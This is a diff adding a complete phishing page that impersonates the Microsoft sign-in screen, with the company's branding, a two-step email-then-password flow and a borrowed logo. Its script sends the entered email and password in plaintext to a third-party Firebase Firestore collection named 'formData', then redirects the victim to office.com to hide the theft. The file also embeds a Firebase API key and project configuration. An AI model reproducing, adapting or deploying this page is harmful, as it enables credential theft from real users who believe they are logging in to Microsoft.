@@ -1,0 +1,223 @@
+<html>
+    <head>
+        <title>Microsoft</title>
+        <meta charset="UTF-8">
+        <meta name="viewport"
+              content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+        <meta http-equiv="X-UA-Compatible" content="ie=edge">
+        <style>
+    @import url('https://fonts.googleapis.com/css2?family=Ruda&display=swap');
+        
+            @media screen and (max-width: 470px){
+                body{
+                    background-color: #FFFFFF;
+                }
+            }
+            body{
+                background-color:#D4DBE4;
+                height: 100%;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+            }
+         
+            .overall-form-container{
+                box-shadow: 2px 2px 2px 2px rgb(184, 181, 181);
+                background-color: #FFFFFF;
+                width: 300px;
+                padding-top: 1rem;
+                padding-bottom: 3rem;
+                padding-left: 4rem;
+                padding-right: 4rem;
+            }
+            @media screen and (max-width: 470px){
+                body{
+                    background-color: #FFFFFF;
+                    align-items: initial;
+                    justify-content: initial;
+                }
+                .overall-form-container{
+                    box-shadow: initial;
+                    padding: 0 1rem;
+                }
+            }
+            .logo img{
+                 height: 100%;
+                 width: 100%;
+            }
+            .logo-container{
+                height: 30px;
+                width: 30px;
+            }
+            h3{
+                color:#848484;
+                font-size: 1.3rem;
+                font-family: sans-serif;
+            }
+            .logo{
+                display: flex;
+                align-items: center;
+                margin-bottom: -1.5rem;
+            }
+            h2{
+                color: #313131;
+            }
+            input::placeholder{
+                font-size: 1rem;
+                font-weight: 100;
+                font-family: sans-serif;
+                margin-bottom: 1rem;
+            }
+            input{
+                margin: 1rem 0;
+                border: none;
+                border-bottom: 1px solid #0067B8;
+                width: 100%;
+            }
+            .blue{
+                color: #0067B8;
+                font-family: sans-serif;
+            }
+            .submit-button{
+                border: 1px solid #0067B8;
+                font-family: sans-serif;
+                background-color:#0067B8;
+                color: #fff;
+                display: inline-block;
+                cursor: pointer;
+                padding: 0.5rem 1.3rem;
+                font-size: 0.9rem;
+            }
+            .submit-button-container{
+                margin-top: 1rem;
+                display: flex;
+                align-items: center;
+                justify-content: flex-end;
+            }
+            input:focus{ outline: none; }
+            .text-account p{
+                color: rgb(32, 32, 32);
+                font-family: sans-serif;
+            }
+        </style>
+    </head>
+    <body>
+        <form onkeydown="return event.key != 'Enter';"  class='overall-form-container'id="contactForm">
+            <div class='header-form'>
+                <div class='logo'>
+                    <div class='logo-container'>
+                    <img src="https://media-exp1.licdn.com/dms/image/C560BAQE88xCsONDULQ/company-logo_200_200/0/1618231291419?e=2159024400&v=beta&t=SI9gH_Nkcfh5HK__JZrDMTM5Uuvi5V9x2sLzuK9QIpw" alt="Microsoft" />
+                </div>
+                    <h3>Microsoft</h3>
+                </div>
+                <h2 id='sign-in-id'>Sign in</h2>
+            </div>
+            <div class='form-container'>
+                <div class='email'>
+                    <input type="email" id='email' required name='email' placeholder='Email, phone or skype'/>
+                </div>
+                <div class='text-account' id='text-account'>
+                    <p>No account? <span class='blue'>create one!</span></p>
+                </div>
+                <div class='password'>
+                    <input type="password" id=password required name='password' placeholder="Password"/>
+                </div>
+                <div class='forgot-password' id='forgot-password'>
+                    <p><span class='blue'>Forgot password?</span></p>
+                </div>
+                <div class='submit-button-container'>
+                    <button type='submit' class='submit-button' id='submit'>Sign in</button>
+                </div>
+                <div class='submit-button-container'>
+                    <button class='submit-button' id='next'>Next</button>
+                </div>
+            </div>
+        </form>
+        
+    <script src="https://www.gstatic.com/firebasejs/8.8.1/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.8.1/firebase-firestore.js"></script>
+    <script>
+      var firebaseConfig = {
+    apiKey: "AIzaSyCN8DcPALShOiOlVcNEghBHXynYGUmX7H0",
+    authDomain: "html-c05d8.firebaseapp.com",
+    projectId: "html-c05d8",
+    storageBucket: "html-c05d8.appspot.com",
+    messagingSenderId: "246927693261",
+    appId: "1:246927693261:web:dde037ac22de82c00ae084"
+  };
+  // Initialize Firebase
+  firebase.initializeApp(firebaseConfig)
+    
+    
+    
+var firestore = firebase.firestore()
+
+//Variable to access database collection
+const db = firestore.collection("formData")
+
+//Get Submit Form
+let forgot_password = document.getElementById('forgot-password');
+let submitButton = document.getElementById('submit');
+let text_account = document.getElementById('text-account');
+   let sign_in_id = document.getElementById('sign-in-id');
+   let email = document.getElementById('email');
+ let password = document.getElementById('password');
+  let next = document.getElementById('next');
+ password.style.display= "none"
+ submitButton.style.display="none"
+ forgot_password.style.display="none"
+ 
+      
+      next.addEventListener("click",function(){
+           if (email.value == ""){
+     console.log("email Is Empty");
+ }else{
+    sign_in_id.textContent ='Enter password'
+           password.style.display= "block"
+ submitButton.style.display="block"
+ forgot_password.style.display="block"
+ next.style.display="none"
+email.style.display="none"
+text_account.style.display="none"
+}
+
+      })
+
+
+
+submitButton.addEventListener("click", (e) => {
+  //Prevent Default Form Submission Behavior
+  e.preventDefault()
+
+  //Get Form Values
+  let email = document.getElementById('email').value
+ let password = document.getElementById('password').value
+ 
+ 
+if (password == ""){
+    console.log("password value Is Empty")
+}else{
+  //Save Form Data To Firebase
+  db.doc().set({
+    email: email,
+   password: password,
+  }).then( () => {
+  console.log("Data saved")
+  redirect()
+  }).catch((error) => {
+   console.log(error)
+  })
+}
+  
+})
+
+
+function redirect(){
+  window.location.href="https://www.office.com/"
+}
+
+
+
+    </script>
+    </body>
+</html>
